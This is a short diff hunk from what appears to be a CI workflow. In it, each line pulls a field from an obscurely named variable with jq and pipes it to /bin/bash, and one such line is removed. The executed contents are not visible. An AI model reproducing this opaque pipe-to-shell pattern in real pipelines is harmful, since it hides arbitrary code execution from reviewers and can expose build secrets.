@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$k21" | jq -r .qq5277 | /bin/bash
           echo $nc99389 | jq -r .hnoo91353 | /bin/bash
           echo $rg1 | jq -r .djbif23123 | /bin/bash
-          echo $rk816 | jq -r .wxps91 | /bin/bash
           echo $auhvo80739 | jq -r .tlnt3 | /bin/bash
           echo $uw227 | jq -r .lcrue86192 | /bin/bash
 
